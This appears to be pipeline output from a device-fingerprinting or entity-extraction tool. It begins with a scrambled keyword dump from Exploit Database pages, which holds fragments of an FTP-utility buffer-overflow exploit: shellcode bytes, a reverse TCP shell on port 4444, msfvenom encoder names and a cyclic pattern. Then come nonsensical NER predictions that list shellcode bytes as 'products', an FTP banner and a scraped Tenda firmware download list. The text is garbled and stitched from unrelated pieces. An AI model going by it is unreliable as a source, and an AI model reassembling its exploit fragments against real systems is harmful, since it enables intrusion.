5858 5900 5984 6066 6070 6080 6082 6101 6112 6129 6502 6503 6660 6667 7001 7002 7070 7071 7080 7100 7144 7210 7272 7290 7426 7443 7510 7547 7649 7770 7777 7778 7787 7879 7902 8000 8001 8002 8004 8008 8020 8022 8023 8028 8030 8080 8081 8082 8088 8090 8181 8300 8400 8443 8445 8473 8500 8585 8619 8800 8812 8839 8880 8888 9000 9001 9002 9080 9090 9091 9100 9124 9200 9251 9256 9443 9447 9784 9788 9855 9876 9900 9987 9993 9999 10000 10001 10080 10202 10203 10443 10616 11000 11211 11460 12203 12221 12345 12397 12401 13327 13701 13722 13838 16992 18821 18881 19000 19810 19813 20000 20010 20031 20111 20171 22003 23423 25672 26000 27015 27700 28015 30000 30303 31337 32400 32674 32764 34205 37215 37777 37848 38292 40007 41523 44334 46824 48080 49152 50000 50496 52311 52789 52869 52986 53413 54345 54890 55554 55555 56380 57772 58080 62514 tag wordpress core metasploit framework 64 minix multiple netbsd_x86 novell openbsd openbsd_x86 osx_ppc osx php plan9 qnx sco sco_x86 solaris solaris_sparc solaris_x86 tru64 ultrix unix unixware windows_x86 windows_x86 exploit database × title cve type dos local remote shellcode papers webapps platform aix asp bsd bsd_ppc bsd_x86 bsdi_x86 cgi freebsd freebsd_x86 freebsd_x86 race condition null pointer dereference malware buffer overflow heap overflow type confusion object injection bug report console pwn2own traversal deserialization verified klcp free kali linux training downloads kali linux kali nethunter kali linux revealed book certifications oscp oswp osce osee oswe klcp training penetration testing bounds remote local xml external entity wordpress plugin sql injection 109 ', 21 )) port 4444 free kali linux training pro services penetration testing advanced attack simulation application security assessment exploit database author 2000 exploit database exploits ghdb papers shellcodes search edb searchsploit manual submissions online training pwk penetration testing close offensive security resources × downloads certifications training services kali linux oscp penetration testing 64 generator hardware hp advanced attack simulation kali linux revealed book osce offensive security wireless attacks link downloads certifications training professional services kali linux oscp penetration testing f python buf python import socket oswe metasploit unleashed advanced attack simulation kali linux revealed book osce cracking kali awae advanced web attacks wifu wireless attacks offsec resources stats metasploit search penetration testing kali nethunter oswp offensive security wireless attacks metasploit unleashed ux irix jsp linux linux_mips linux_ppc linux_sparc linux_x86 linux_x86 klcp free kali linux training close search penetration testing kali nethunter oswp advanced web attacks x86 -- platform windows windows 7 sp1 64bits db history faq search get certified konica minolta ftp utility 1 microsoft windows p windows windows date application security assessment osee advanced web attacks 1060 print "\ sending evil buffer ...." high end penetration testing services 00 post auth cwd command seh overflow application security assessment osee cracking code injection command injection authentication bypass provides various information security certifications offensive security wireless attacks term “ dork ” became shorthand exploit database × konica minolta ftp utility 1 konica minolta ftp utility v1 information security training company may web application vulnerability releases kali linux offensive security certified professional us faq © copyright 2019 certified penetration tester enroll advanced web attacks need actionable data right away offensive security terms privacy penetration testing 7768 edb verified cwd command overflow internet search engine queries designed x86 )\ konica minolta "" buf += "\ xbe online repositories like github kali :~# nc book google hacking remote exploit integer overflow server term “ googledork ” tomiwa type online search engines exploit database buf += "\ xe9 buf += "\ xe3 buf += "\ xaf buf += "\ x56 buf += "\ x16 cve compliant archive send (' pass anonymous “ google problem ” yet equally valuable results google hacking database db exploit “ google hacking ” buf += "\ xef buf += "\ xdf buf += "\ xd7 buf += "\ xc9 buf += "\ xab buf += "\ xa1 buf += "\ x8e buf += "\ x79 buf += "\ x73 buf += "\ x62 buf += "\ x5b buf += "\ x4f buf += "\ x42 buf += "\ x3a buf += "\ x32 buf += "\ x2e buf += "\ x29 buf += "\ x24 buf += "\ x20 buf += "\ x1f buf += "\ x1d buf += "\ x15 buf += "\ x12 offensive security send (' user anonymous c :\ program files >> 12206d9d buffer ghdb includes searches information made publicly available oscp buffer +'\ r penetration testers title free dos get certified send (' cwd vulnerable web sites revealed ftp utility 39215 cve direct submissions “ dorks ” navigate database database known b "\ x00 close tags search engine platform side request forgery reverse netcat connection often unintentional misconfiguration http :// download hardcoded ip address early talk recorded site request forgery pwk located sensitive information 2009 microsoft corporation exploit search query n ') data corresponding vulnerable software community member effort client side use professional hacker web document public exploits exploits gathered connect ((' 192 buffer 11 vulnerable app software link ghdb edb wifu credentials bypass awae "\ x9d "\ x41 1 vulnerability researchers sensitive information "\ xeb "\ x90 e x86 exploits google “. valuable resource program installed n ') made public cracking link site scripting '\ r usually sensitive version 6 uncover interesting subsequently followed show examples shell_reverse_tcp lhost seh rights reserved public sources profit project producing different process known november 2010 media attention mailing lists johnny ’ johnny turned johnny long johnny coined initial efforts inept person hard work file inclusion draw attention defcon 13 course required countless hours comprehensive collection categorized index began cataloging 118 lport 00 #!/ usr "* 1955 buf nlvp 4444 4444 ... “ public service never meant concepts rather information xbe us queries internet data copyright xef xdf xd7 xc9 xab xa1 x8e x79 x73 x62 x5b x4f x42 x3a x32 x2e x29 x24 x20 x1f x1d x15 x12 user c available 109 use software socket connect community app 192 11 4444 xeb x90 tomiwa service rather meant date zip xxe xss xff xfe xfb xfa xf9 xf6 xf5 xf4 xf3 xf2 xf0 xed xec xea xe8 xe7 xe6 xe2 xe1 xe0 xdd xdc xdb xda xd9 xd8 xd5 xd4 xd3 xd1 xd0 xcf xce xcd xcc xcb xc8 xc7 xc6 xc4 xc3 xc2 xc1 xc0 xbf xbb xba xb9 xb7 xb6 xb4 xb3 xb2 xb1 xb0 xae xad xac xaa xa9 xa8 xa7 xa6 xa5 xa4 xa3 xa2 xa0 x9f x9e x9c x9a x99 x98 x97 x95 x92 x91 x8f x8d x8c x8b x8a x89 x88 x84 x83 x81 x80 x7e x7c x7b x7a x77 x76 x75 x74 x72 x71 x6f x6e x6d x6b x6a x69 x68 x66 x65 x64 x63 x61 x5f x5e x5d x5c x5a x59 x57 x55 x54 x53 x51 x50 x4e x4d x49 x48 x45 x44 x40 x3f x3e x3d x3c x3b x39 x37 x36 x35 x33 x31 x2f x2d x2c x2b x28 x25 x23 x21 x1e x1b x1a x18 x17 x14 x13 x11 x10 x0e x0d x0c x0b x0a x08 x07 x06 x05 x04 x03 x02 well unknown uaf today time tested talks subject ssrf sqli source sock_stream shikata_ga_nai serve root rfi result repository refer recv provided proof present popularized popularised perimeter part number nseh non nearly msfvenom msfu msf mfpu making maintained listening listen linked lfi konicaminolta indexed included id hk ftpu_10 ftpu freely foolish factors fact extension exploitation easy due driver documented developed denial decade ctp csrf cross crawled cb cases bt bing bin become barrage amplified aim af_inet advisory advisories ab aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9ak0ak1ak2ak3ak4ak5ak6ak7ak8ak9al0al1al2al3al4al5al6al7al8al9am0am1am2am3am4am5am6am7am8am9an0an1an2an3an4an5an6an7an8an9ao0ao1ao2ao3ao4ao5ao6ao7ao8ao9ap0ap1ap2ap3ap4ap5ap6ap7ap8ap9aq0aq1aq2aq3aq4aq5aq6aq7aq8aq9ar0ar1ar2ar3ar4ar5ar6ar7ar8ar9as0as1as2as3as4as5as6as7as8as9at0at1at2at3at4at5at6at7at8at9au0au1au2au3au4au5au6au7au8au9av0av1av2av3av4av5av6av7av8av9aw0aw1aw2aw3aw4aw5aw6aw7aw8aw9ax0ax1ax2ax3ax4ax5ax6ax7ax8ax9ay0ay1ay2ay3ay4ay5ay6ay7ay8ay9az0az1az2az3az4az5az6az7az8az9ba0ba1ba2ba3ba4ba5ba6ba7ba8ba9bb0bb1bb2bb3bb4bb5bb6bb7bb8bb9bc0bc1bc2bc3bc4bc5bc6bc7bc8bc9bd0bd1bd2bd3bd4bd5bd6bd7bd8bd9be0be1be2be3be4be5be6be7be8be9bf0bf1bf2bf3bf4bf5bf6bf7bf8bf9bg0bg1bg2bg3bg4bg5bg6bg7bg8bg9bh0bh1bh2bh3bh4bh5bh6bh7bh8bh9bi0bi1bi2bi3bi4bi5bi6bi7bi8bi9bj0bj1bj2b 7601 49158 30 3 2016 2015 168 1037 1024 08 01 0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "microsoft",
+    "arm",
+    "cgi"
+  ],
+  "device_types": [],
+  "products": [
+    "sh4",
+    "crisv32",
+    "x86",
+    "x86",
+    "plan9",
+    "x86",
+    "x86",
+    "tru64",
+    "x86",
+    "x86",
+    "x86",
+    "x86",
+    "pwn2own",
+    "x86",
+    "x86",
+    "sp1",
+    "v1",
+    "xe9",
+    "xe3",
+    "x56",
+    "x16",
+    "xd7",
+    "xc9",
+    "xa1",
+    "x8e",
+    "x79",
+    "x73",
+    "x62",
+    "x5b",
+    "x4f",
+    "x42",
+    "x3a",
+    "x32",
+    "x2e",
+    "x29",
+    "x24",
+    "x20",
+    "x1f",
+    "x1d",
+    "x15",
+    "x12",
+    "d9d",
+    "x00",
+    "x9d",
+    "x41",
+    "x90",
+    "xf9",
+    "xf6",
+    "xf5",
+    "xf4",
+    "xf3",
+    "xf2",
+    "xf0",
+    "xe8",
+    "xe7",
+    "xe6",
+    "xe2",
+    "xe1",
+    "xe0",
+    "xd9",
+    "xd8",
+    "xd5",
+    "xd4",
+    "xd3",
+    "xd1",
+    "xd0",
+    "xc8",
+    "xc7",
+    "xc6",
+    "xc4",
+    "xc3",
+    "xc2",
+    "xc1",
+    "xc0",
+    "xb9",
+    "xb7",
+    "xb6",
+    "xb4",
+    "xb3",
+    "xb2",
+    "xb1",
+    "xb0",
+    "xa9",
+    "xa8",
+    "xa7",
+    "xa6",
+    "xa5",
+    "xa4",
+    "xa3",
+    "xa2",
+    "xa0",
+    "x9f",
+    "x9e",
+    "x9c",
+    "x9a",
+    "x99",
+    "x98",
+    "x97",
+    "x95",
+    "x92",
+    "x91",
+    "x8f",
+    "x8d",
+    "x8c",
+    "x8b",
+    "x8a",
+    "x89",
+    "x88",
+    "x84",
+    "x83",
+    "x81",
+    "x80",
+    "x7e",
+    "x7c",
+    "x7b",
+    "x7a",
+    "x77",
+    "x76",
+    "x75",
+    "x74",
+    "x72",
+    "x71",
+    "x6f",
+    "x6e",
+    "x6d",
+    "x6b",
+    "x6a",
+    "x69",
+    "x68",
+    "x66",
+    "x65",
+    "x64",
+    "x63",
+    "x61",
+    "x5f",
+    "x5e",
+    "x5d",
+    "x5c",
+    "x5a",
+    "x59",
+    "x57",
+    "x55",
+    "x54",
+    "x53",
+    "x51",
+    "x50",
+    "x4e",
+    "x4d",
+    "x49",
+    "x48",
+    "x45",
+    "x44",
+    "x40",
+    "x3f",
+    "x3e",
+    "x3d",
+    "x3c",
+    "x3b",
+    "x39",
+    "x37",
+    "x36",
+    "x35",
+    "x33",
+    "x31",
+    "x2f",
+    "x2d",
+    "x2c",
+    "x2b",
+    "x28",
+    "x25",
+    "x23",
+    "x21",
+    "x1e",
+    "x1b",
+    "x1a",
+    "x18",
+    "x17",
+    "x14",
+    "x13",
+    "x11",
+    "x10",
+    "x0e",
+    "x0d",
+    "x0c",
+    "x0b",
+    "x0a",
+    "x08",
+    "x07",
+    "x06",
+    "x05",
+    "x04",
+    "x03",
+    "x02",
+    "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9ak0ak1ak2ak3ak4ak5ak6ak7ak8ak9al0al1al2al3al4al5al6al7al8al9am0am1am2am3am4am5am6am7am8am9an0an1an2an3an4an5an6an7an8an9ao0ao1ao2ao3ao4ao5ao6ao7ao8ao9ap0ap1ap2ap3ap4ap5ap6ap7ap8ap9aq0aq1aq2aq3aq4aq5aq6aq7aq8aq9ar0ar1ar2ar3ar4ar5ar6ar7ar8ar9as0as1as2as3as4as5as6as7as8as9at0at1at2at3at4at5at6at7at8at9au0au1au2au3au4au5au6au7au8au9av0av1av2av3av4av5av6av7av8av9aw0aw1aw2aw3aw4aw5aw6aw7aw8aw9ax0ax1ax2ax3ax4ax5ax6ax7ax8ax9ay0ay1ay2ay3ay4ay5ay6ay7ay8ay9az0az1az2az3az4az5az6az7az8az9ba0ba1ba2ba3ba4ba5ba6ba7ba8ba9bb0bb1bb2bb3bb4bb5bb6bb7bb8bb9bc0bc1bc2bc3bc4bc5bc6bc7bc8bc9bd0bd1bd2bd3bd4bd5bd6bd7bd8bd9be0be1be2be3be4be5be6be7be8be9bf0bf1bf2bf3bf4bf5bf6bf7bf8bf9bg0bg1bg2bg3bg4bg5bg6bg7bg8bg9bh0bh1bh2bh3bh4bh5bh6bh7bh8bh9bi0bi1bi2bi3bi4bi5bi6bi7bi8bi9bj0bj1bj2b"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.tendacn.com/en/service/download-cata-11.html===============================
+
+Firmware-Tenda-All For Better NetWorking  WorldwideFor HomeFor BusinessServicePartnersProfileMeshRouterSwitchPowerlineSmart HomeAdapterBroadband CPE3G/4GExtenderIP CameraWirelessSwitchCabling SystemOnline serviceDownloadFAQSimulatorFor HomeMeshRouterSwitchPowerlineSmart HomeAdapterBroadband CPE3G/4GExtenderIP CameraFor BusinessWirelessSwitchCabling SystemSupportPartnersAbout UsProfileContact UsNewsVideoWorldwideFirmwareTenda Firmware Download#NAMETYPEDATEFILE01WH450A Firmware V1.0.0.18_EN Firmware2014-06-1802WH450A Firmware V2.0.0.1_EN Firmware2016-03-1003WH302A Firmware V2.0.0.3_EN Firmware2016-03-1004WH302A Firmware V1.0.0.3_EN Firmware2014-10-2805W900A Firmware V2.0.0.4(1217)_EN Firmware2016-03-1006W900A Firmware V1.0.0.17_EN Firmware2014-11-2507W9 Firmware V1.0.0.6(1641)_EN Firmware2018-05-1508W6-US Firmware V1.0.0.1(353)_EN Firmware2016-12-2709W6-S Firmware V1.0.0.5(511)_EN Firmware2017-04-2710W6 Firmware V1.0.0.9(4122)_EN Firmware2018-10-1211W6 Firmware V1.0.0.4(2015)_EN Firmware2016-03-1012W6 Firmware V1.0.0.8(3827)_EN Firmware2016-07-1913W568R Firmware V1.0.1.13_EN Firmware2013-04-1114W568R Firmware V1.0.1.17_EN Firmware2013-11-2915W568R
+Firmware V1.0.1.8_EN Firmware2012-11-1916W368R Firmware V5.07.37_EN Firmware2013-10-1217W330R Firmware V3.1.201d_EN Firmware2011-03-2318W330R Firmware V3.1.201f_EN Firmware2012-12-0519W330A Firmware V1.0.0.1_cn&en Firmware2014-11-2520W316R Firmware V5.07.32_EN Firmware2012-12-0521W316R Firmware V5.19.10_EN Firmware2012-12-0522W316R Firmware V5.07.42_EN Firmware2012-12-1423W316R Firmware V5.19.12_EN(HONGKONG) Firmware2012-04-2624W316R Firmware V5.19.08_EN Firmware2011-08-0225W316R Firmware V5.07.15_EN Firmware2011-10-0726W316R Firmware V5.07.25_EN Firmware2011-12-0727W316R Firmware V5.07.46_EN Firmware2013-09-2728W312A Firmware V1.0.0.6_EN Firmware2014-10-3029W312A Firmware V1.0.0.4_EN Firmware2014-06-1730W312A Firmware V2.0.0.3(1330)_EN Firmware2016-03-2931W311R+ Firmware V5.07.47_EN Firmware2013-07-0532W311R+ Firmware V5.07.25_EN Firmware2011-12-0733W311R+ Firmware V5.19.08_EN Firmware2011-11-1034W311R+ Firmware V5.07.15_EN Firmware2011-11-1035W311R+ Firmware H1_V3.3.6d_EN Firmware2011-03-2336W311R+ Firmware H3_V3.3.6h_EN Firmware2011-03-2337W311R+ Firmware V3.2.4.02s_EN Firmware2011-03-2338W311R+ Firmware V5.19.10_EN Firmware2012-12-0539W311R Firmware V5.19.10_EN Firmware2012-12-0540W311R Firmware V3.2.4.02s_EN Firmware2011-03-2341W311R Firmware V5.19.08_EN Firmware2011-11-1042W311R Firmware V5.07.15 _EN Firmware2011-11-1043W311R Firmware V5.07.25_EN Firmware2011-12-0744W311R Firmware V5.07.46_EN Firmware2013-09-2745W311R Firmware V5.07.47_EN Firmware2014-02-1446W309R Firmware V5.07.64_EN Firmware2014-03-0147W309R Firmware V5.07.68_EN Firmware2014-05-0648W309R Firmware V5.19.08_EN Firmware2011-08-0249W309R Firmware V5.07.28_HONG KONG Firmware2012-04-2650W309R Firmware V5.07.33_EN Firmware2012-06-2851W308R Firmware V5.07.09_EN(Korea Version) Firmware2011-11-2852W308R Firmware V5.07.26_EN Firmware2012-03-0753W308R Firmware V5.07.28_HONGKONG Firmware2012-04-2654W308R Firmware V5.07.33_EN Firmware2012-06-2855W308R Firmware V5.07.42_EN Firmware2012-12-1456W308R Firmware V5.19.08_EN Firmware2011-08-0257W308R Firmware V5.07.51_EN Firmware2013-09-2758W308R Firmware V5.07.46_EN Firmware2013-06-0359W308R Firmware V5.07.54_EN Firmware2016-03-2960W303R Firmware V5.07.46_EN Firmware2014-03-0161W303R Firmware V5.07.33_EN Firmware2012-06-2862W301A Firmware V3.3.4J_EN Firmware2011-09-2663W301A Firmware V1.0.0.3_EN Firmware2014-08-2264W301A Firmware V1.0.0.5_EN Firmware2014-10-2965W300D(V6.0) Firmware V1.0.1.20_EN Firmware2014-01-0266W300D(V5.0) Firmware V1.1.0.10_EN Firmware2012-12-0667W300D(V3.0) Firmware V1.0.1_EN Firmware2011-10-2168W300D(V3.0) Firmware V1.0.0_EN Firmware2011-08-0269W300A Firmware V2.4.15_EN Firmware2009-11-0470W3002R Firmware V5.07.42_EN Firmware2013-05-1371W3002R Firmware V5.07.71_EN Firmware2014-09-3072W3002R Firmware V5.07.64_EN Firmware2014-03-0173W3002R Firmware V5.07.67_EN(For
+Austrilia) Firmware2014-06-0574W268R Firmware H1_V3.3.6d_EN Firmware2011-04-0675W268R Firmware H3_V3.3.6h_EN Firmware2011-04-0676W268R Firmware V3.2.4.02s_EN Firmware2011-04-0677W268R Firmware V5.19.08_EN Firmware2011-11-1078W268R Firmware V5.07.15_EN Firmware2011-11-1079W1801R Firmware V2.0.0.1_EN Firmware2014-11-2680W1801R Firmware V2.0.0.10_EN Firmware2015-03-0481W1800R Firmware V1.1.0.0_EN Firmware2013-03-1882W1800R Firmware V2.0.1.3_EN Firmware2014-08-1583W1800R Firmware V2.0.0.1_EN Firmware2013-11-2984W15E Firmware V15.11.0.5(1068_1567_841)_EN Firmware2017-06-1985W150D(V5.0) Firmware V1.1.0.10_EN Firmware2012-12-0686W150D(V3.0) Firmware V1.0.1_EN Firmware2011-10-2187W150D(V3.0) Firmware V1.0.0_EN Firmware2011-08-0288W1500A Firmware V1.0.1.22_EN Firmware2013-05-1089W1500A Firmware V1.0.1.25_EN Firmware2014-09-2290W1500A Firmware V1.0.1.27_EN Firmware2014-11-2591W1500A Firmware V1.0.1.23_EN Firmware2014-06-2792W1500A Firmware V1.0.1.30_EN Firmware2015-12-0193V300 Firmware V53.0.1.6_EN Firmware2018-10-1294TEG3224P V1.0 Firmware V102R001 Firmware2014-02-2095TEG3224P Firmware V102R001_EN Firmware2014-06-1796TEG3210P Firmware V102R004 Firmware2014-10-1397TEG3210P Firmware V60.0.2.2_EN Firmware2016-08-1598PW201A Firmware V2.0.0.2_EN Firmware2018-10-1299PW201A Firmware V1.1.2.2_en_EU Firmware2017-01-04100PW201A Firmware V1.1.2.2_en_US Firmware2017-01-04101PW201A
+Firmware V1.0.5_EN Firmware2012-11-19102PH3 Firmware V3.2.2_EU Firmware2017-01-04103PH3 Firmware V3.2.4_US Firmware2017-01-04104PA7 Firmware V1.0.0.6_EN Firmware2018-05-08105PA6 Firmware V1.0.1.21_EN Firmware2018-05-08106PA6 Firmware V1.0.1.11_EN Firmware2017-01-04107P6 Firmware 3.2.4_EN Firmware2018-05-08108P6 Firmware 3.2.4_US Firmware2018-05-08109P3 Firmware 3.2.4_US Firmware2018-05-08110P200 Firmware V2.3.6c_US Firmware2015-04-23111P200 Firmware V2.3.6c_EU Firmware2015-04-23112P200 Firmware V1.0.0.1_EN Firmware2012-12-06113P1002 Firmware V3.1.8 Firmware2015-04-23114P1001P Firmware V3.1.8 Firmware2015-06-03115P1000 Firmware V3.1.8_US Firmware2015-04-23116O6 Firmware v1.0.0.5(4051) Firmware2016-08-17117O6 Firmware v1.0.0.8(4100) Firmware2016-08-17118O6 Firmware V1.0.0.15(4977)_EN Firmware2018-05-08119O6 Firmware V1.0.0.16(5017)_EN Firmware2018-10-12120O6 Firmware V1.0.0.14(4754) Firmware2017-04-13121O6 Firmware V1.0.0.13(4741) Firmware2017-04-13122O3V2.0 Firmware V1.0.0.10(2478)EN Firmware2018-08-17123O3V2.0 Firmware V1.0.0.12(3880)_EN Firmware2019-03-13124O3 Firmware V1.0.0.10(4730) Firmware2017-04-13125O3 Firmware V1.0.0.11(4758) Firmware2017-04-13126O3 Firmware V1.0.0.5(4180)_EN Firmware2017-04-13127O3 Firmware V1.0.0.3_EN Firmware2015-12-04128O1 Firmware V1.0.0.7(1736)_EN Firmware2018-05-15129O1 Firmware V1.0.0.11(3899)_EN Firmware2019-03-13130NH326(V2.0) Firmware V1.0.3.1_EN Firmware2015-04-14131N80 Firmware V1.0.1.8_EN Firmware2012-11-19132N80 Firmware V1.0.1.13_EN Firmware2013-04-11133N80 Firmware V1.0.1.17_EN Firmware2013-11-29134N60 Firmware V2.0.3.0_EN Firmware2013-04-11135N60 Firmware V2.0.4.1_EN Firmware2013-05-08136N60 Firmware V1.0.0.16_EN Firmware2012-11-19137N6 Firmware V1.0.0.16_EN Firmware2012-12-12138N6 Firmware V2.0.4.1_EN Firmware2013-05-08139N6 Firmware V2.0.4.3_EN Firmware2014-03-01140N4 Firmware V5.07.49_EN Firmware2015-08-17141N301 Firmware V11.13.01.23_EN Firmware2016-04-19142N301 Firmware V12.01.01.42_EN Firmware2018-07-20143N301 Firmware V12.01.01.45_EN Firmware2018-10-12144N301 Firmware V12.01.01.28_EN Firmware2017-08-10145N301 Firmware V12.01.01.28_EN Firmware2018-02-25146N301 Firmware V5.07.49_EN Firmware2013-10-21147N30 Firmware V5.07.46_EN Firmware2014-03-01148N30 Firmware V5.07.26_EN Firmware2012-11-19149N3 Firmware V5.07.28_HONG KONG Firmware2012-04-26150N3 Firmware V5.07.15_EN Firmware2011-11-10151N3 Firmware V5.07.25_EN Firmware2011-12-08152N3 Firmware V5.07.46_EN Firmware2014-03-01153N150 Firmware V5.07.49_EN Firmware2013-10-17154M3 Firmware V1.0.0.10(4767) Firmware2017-04-13155M3 Firmware V1.0.0.4(2089)_EN Firmware2016-03-10156M3 Firmware V1.0.0.6_EN Firmware2016-07-19157M3 Firmware V1.0.0.12(4856)_EN Firmware2019-04-16158i9 Firmware V1.0.0.7(1171)_EN Firmware2018-08-17159I6 Firmware V1.0.0.8(3856) Firmware2017-04-13160i6 Firmware V1.0.0.9(3857)_EN Firmware2016-07-19161i6 Firmware V1.0.0.5(2120)EN Firmware2016-01-08162i21 Firmware V1.0.0.8(1418)_EN Firmware2018-08-17163I12 Firmware V1.0.0.10(3805) Firmware2017-04-13164i12 Firmware V1.0.0.4(2084)_EN Firmware2016-01-08165i12 Firmware V1.0.0.11(3862)_EN Firmware2016-07-19166G3V3.0 Firmware V15.11.0.6(7663)_EN Firmware2019-03-13167G300 Firmware V100R003 Firmware2013-09-24168G3(V2.0） Firmware V2.0.0.1_EN Firmware2016-07-05169G3 Firmware V15.11.0.2_EN Firmware2018-08-17170G3 Firmware V15.01.0.5(2848_755)_EN Firmware2018-05-15171G103 Firmware V1.0.0.2_EN Firmware2017-01-17172G103 Firmware V1.0.0.5_EN Firmware2017-01-17173FH456V4.0 Firmware V12.01.01.30_multi_EN Firmware2017-05-09174FH456V2.0 Firmware V11.13.01.09_EN Firmware2016-03-03175FH456V1.0 Firmware V11.11.01.07_EN Firmware2016-03-03176FH456V1.0 Firmware V10.1.1.1_EN Firmware2015-06-25177FH456 V2.0 Firmware V11.13.01.20_EN Firmware2016-04-19178FH456 Firmware V12.01.01.41_multi_EN Firmware2018-05-15179FH330(V2.0) Firmware V1.0.3.1_EN Firmware2015-04-14180FH330 V3.0 Firmware V11.13.01.04_EN Firmware2016-03-04181FH307 Firmware V5.07.64_EN Firmware2018-10-12182FH305 Firmware V5.07.58_EN Firmware2013-10-17183FH304 Firmware V5.07.58_EN Firmware2014-11-26184FH303 Firmware V5.07.68_EN Firmware2016-03-29185FH303 Firmware V5.07.58_EN Firmware2013-10-30186FH1206 Firmware V1.2.0.8(8155)_EN Firmware2014-11-26187FH1202 Firmware V1.2.0.14(408)_EN Firmware2015-02-06188FH1202 Firmware V1.2.0.19_EN Firmware2016-03-17189FH1202 Firmware V1.2.0.20(408)_EN Firmware2017-05-19190FH1201 Firmware V1.2.0.14(408)_EN Firmware2018-10-12191FH1201 Firmware V1.2.0.8_EN Firmware2014-04-17192F9 Firmware V12.01.01.43_EN Firmware2018-10-12193F9 Firmware V12.01.01.36_EN Firmware2017-06-30194F9 Firmware V12.01.01.42_EN Firmware2017-11-17195F9 Firmware V12.01.01.45_multi Firmware2019-02-15196F456 Firmware V1.0.0.9(8097)_EN Firmware2014-12-08197F456 Firmware V1.0.0.5_EN Firmware2013-12-20198F452 Firmware V1.0.0.3_EN Firmware2014-03-01199F452 Firmware V1.0.0.1_EN Firmware2013-10-17200F303 Firmware V5.07.46_EN Firmware2013-10-21201F303 Firmware V5.07.53_EN Firmware2016-03-29202F300 Firmware V5.07.53_EN Firmware2014-08-16203F300 Firmware V12.01.01.38_EN Firmware2018-10-12204F300 Firmware V5.07.46_EN Firmware2013-06-05205F300 Firmware V12.01.01.42_EN Firmware2018-12-24206F3 Firmware V12.01.01.48_multi Firmware2018-12-04207F3 Firmware V12.01.01.41_multi Firmware2018-05-22208F3 Firmware V12.01.01.42_EN Firmware2018-07-20209F3 Firmware V11.13.01.23_EN Firmware2016-04-19210F3 Firmware V11.13.01.06_EN Firmware2015-07-16211F1201 Firmware V1.2.0.8_EN Firmware2014-04-17212F1200 Firmware V1.2.0.8_EN Firmware2014-04-17213E101（V2.0） Firmware V1.10.0.1_EN Firmware2015-12-04214E101 Firmware V1.10.0.3_EN Firmware2018-10-12215DH301 Firmware V10.2.7_EN Firmware2015-07-18216DH301 Firmware V10.2.6_EN Firmware2014-11-26217D830R Firmware V1.1.2_EN Firmware2013-04-24218D830R Firmware V1.0.7_EN Firmware2012-03-07219D830R Firmware V3.12.03_EN Firmware2011-09-09220D820R Firmware V3.12.01_EN Firmware2012-03-07221D820R Firmware V1.0.7_EN Firmware2012-03-07222D820R Firmware V1.1.2_EN Firmware2013-04-24223D305 Firmware V50.1.12.8_EN Firmware2015-11-12224D303 Firmware V5.2.2.6_EN Firmware2015-07-02225D303 Firmware V5.2.1.11_EN Firmware2014-08-26226D302 Firmware V2.2.1_EN Firmware2014-03-11227D302 Firmware V2.2.0.5_EN Firmware2013-11-15228D301V2.0 Firmware V50.22.1.8_EN Firmware2017-02-20229D301 Firmware V1.2.11.2_EN Firmware2018-10-12230D301 Firmware V1.2.10.1_EN Firmware2015-07-18231D301 Firmware V1.0.5_EN Firmware2013-09-24232D152 Firmware V2.2.0.5_EN Firmware2013-11-15233D152 Firmware V2.2.1_EN Firmware2014-03-11234D151 V2.0 Firmware V50.21.1.5_EN Firmware2017-03-22235D151 Firmware V1.1.7.2_EN Firmware2015-07-18236D151 Firmware V1.0.6_EN Firmware2013-09-24237D1201 Firmware V9.4.8_EN Firmware2014-11-25238C50s V4.0 System Firmware  Firmware2016-08-18239C50s V2.0 system firmware  Firmware2015-09-25240AP5 Firmware V1.0.0.9(2224)_EN Firmware2016-03-29241AP5 Firmware V1.0.0.12(3916)_EN Firmware2016-07-19242AP5 Firmware V1.0.0.13(3920)_EN Firmware2016-07-19243AP4 Firmware V1.0.0.12(3916)_EN Firmware2016-07-19244AP4 Firmware V1.0.0.5(3920)_EN Firmware2016-07-19245AP4 Firmware V1.0.0.11(2224)_EN Firmware2016-03-29246AH302 Firmware V5.07.65_EN Firmware2013-11-19247AH302 Firmware V5.07.67_EN Firmware2014-09-01248AC9V1.0 Firmware V15.03.2.10_EN Firmware2016-05-16249AC9V1.0 Firmware V15.03.2.13_EN Firmware2016-10-14250AC9V1.0 Firmware V15.03.05.14_EN Firmware2017-04-28251AC9V1.0 Firmware V15.03.05.16_multi_TRU Firmware2018-08-09252AC6V2.0 Firmware V15.03.06.50_EN Firmware2018-10-12253AC6v1.0 Firmware V15.03.05.16_multi Firmware2017-05-09254AC500 Firmware V1.0.0.14_EN Firmware2014-10-29255AC5 Firmware V15.03.06.47_EN Firmware2018-05-08256AC18 Firmware V15.03.05.05_EN Firmware2017-01-09257AC18 Firmware V15.03.3.10_EN Firmware2016-11-28258AC15 Firmware V15.03.1.17_EN Firmware2016-04-13259AC15 Firmware V15.03.1.10_EN Firmware2015-09-29260AC15 Firmware V15.03.1.12_EN Firmware2015-10-21261AC15 Firmware V15.03.1.8_EN Firmware2015-09-15262AC15 Firmware V15.03.1.16_EN Firmware2015-11-24263AC15 Firmware 